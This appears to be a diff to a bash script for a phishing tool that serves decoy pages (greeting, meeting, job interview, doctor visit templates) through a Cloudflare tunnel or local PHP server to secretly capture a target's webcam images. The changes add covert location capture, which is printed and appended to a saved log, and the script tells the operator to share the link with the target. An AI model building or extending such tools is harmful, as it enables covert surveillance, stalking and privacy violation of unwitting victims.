@@ -55,13 +55,25 @@ catch_data() {
             mv "$cam" captured_images/ 2>/dev/null
         done
     fi
+
+    if [[ -e "location_current.txt" ]]; then
+        printf "\n\e[1;92m🐐[\e[0m+\e[1;92m] Location captured!\e[0m\n"
+        while IFS= read -r line; do
+            printf "\e[1;97m    %s\e[0m\n" "$line"
+        done < location_current.txt
+        mkdir -p saved_locations 2>/dev/null
+        cat location_current.txt >> saved_locations/locations.log
+        rm -rf location_current.txt
+    fi
 }
 
 checkfound() {
     mkdir -p captured_images 2>/dev/null
+    mkdir -p saved_locations 2>/dev/null
     printf "\n"
     printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for target... Press Ctrl+C to exit\e[0m\n"
     printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera tracking \e[0m\e[1;91mACTIVE\e[0m\n"
+    printf "\e[1;92m🐐[\e[0m\e[1;77m*\e[0m\e[1;92m] Location tracking \e[0m\e[1;91mACTIVE\e[0m\n"
     printf "\n"
     
     while true; do
@@ -72,9 +84,9 @@ checkfound() {
 
 select_template() {
     printf "\n"
-    printf "\e[1;90m    ╔══════════════════════════════════════╗\e[0m\n"
+    printf "\e[1;90m    ╔══════════════════════════════════════════════════╗\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;97m            TEMPLATES                 \e[0m\e[1;90m║\e[0m\n"
-    printf "\e[1;90m    ╠══════════════════════════════════════╣\e[0m\n"
+    printf "\e[1;90m    ╠══════════════════════════════════════════════════╣\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [1] Festival Greeting\e[0m\e[1;90m               ║\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [2] Online Meeting\e[0m\e[1;90m                  ║\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [3] Live Stream\e[0m\e[1;90m                     ║\e[0m\n"
@@ -83,7 +95,7 @@ select_template() {
     printf "\e[1;90m    ║\e[0m\e[1;92m  [6] Support Chat\e[0m\e[1;90m                    ║\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [7] Job Interview\e[0m\e[1;90m                   ║\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [8] Doctor Visit\e[0m\e[1;90m                    ║\e[0m\n"
-    printf "\e[1;90m    ╚══════════════════════════════════════╝\e[0m\n"
+    printf "\e[1;90m    ╚══════════════════════════════════════════════════╝\e[0m\n"
     printf "\n"
     read -p $'\e[1;92m🐐[\e[0m+\e[1;92m] Choose template: \e[0m' template_opt
 
@@ -102,12 +114,12 @@ select_template() {
 
 tunnel_select() {
     printf "\n"
-    printf "\e[1;90m    ╔══════════════════════════════════════╗\e[0m\n"
+    printf "\e[1;90m    ╔══════════════════════════════════════════════════╗\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;97m           TUNNEL OPTIONS             \e[0m\e[1;90m║\e[0m\n"
-    printf "\e[1;90m    ╠══════════════════════════════════════╣\e[0m\n"
+    printf "\e[1;90m    ╠══════════════════════════════════════════════════╣\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;92m  [1] Cloudflare Tunnel (Recommended)\e[0m\e[1;90m ║\e[0m\n"
     printf "\e[1;90m    ║\e[0m\e[1;94m  [2] Localhost Only\e[0m\e[1;90m                  ║\e[0m\n"
-    printf "\e[1;90m    ╚══════════════════════════════════════╝\e[0m\n"
+    printf "\e[1;90m    ╚══════════════════════════════════════════════════╝\e[0m\n"
     printf "\n"
     read -p $'\e[1;92m🐐[\e[0m+\e[1;92m] Choose tunnel: \e[0m' tunnel_opt
 
@@ -149,15 +161,15 @@ cloudflare_tunnel() {
     fi
 
     printf "\n"
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\e[1;97m     SHARE THIS LINK WITH YOUR TARGET \e[0m\n"
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\e[1;96m    %s\e[0m\n" "$link"
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\n"
     
-    # Replace the forwarding link in template and copy to index.html
-    sed "s+forwarding_link+$link+g" "$TEMPLATE_FILE" > index.html
+    # Replace URLs in template and copy to index.html
+    sed "s|https://colleges-digest-angela-cholesterol.trycloudflare.com|$link|g" "$TEMPLATE_FILE" > index.html
     checkfound
 }
 
@@ -166,19 +178,19 @@ localhost_server() {
     php -S 0.0.0.0:3333 > /dev/null 2>&1 &
     
     printf "\n"
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\e[1;97m     LOCALHOST URLS \e[0m\n"
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\e[1;96m    http://localhost:3333\e[0m\n"
     
     ip_addr=$(ip addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -n1)
     if [[ -n "$ip_addr" ]]; then
         printf "\e[1;96m    http://%s:3333\e[0m\n" "$ip_addr"
     fi
-    printf "\e[1;92m═══════════════════════════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m══════════════════════════════════════════════════════════════════════\e[0m\n"
     printf "\n"
     
-    sed "s+forwarding_link+http://localhost:3333+g" "$TEMPLATE_FILE" > index.html
+    sed "s|https://colleges-digest-angela-cholesterol.trycloudflare.com|http://localhost:3333|g" "$TEMPLATE_FILE" > index.html
     checkfound
 }
 
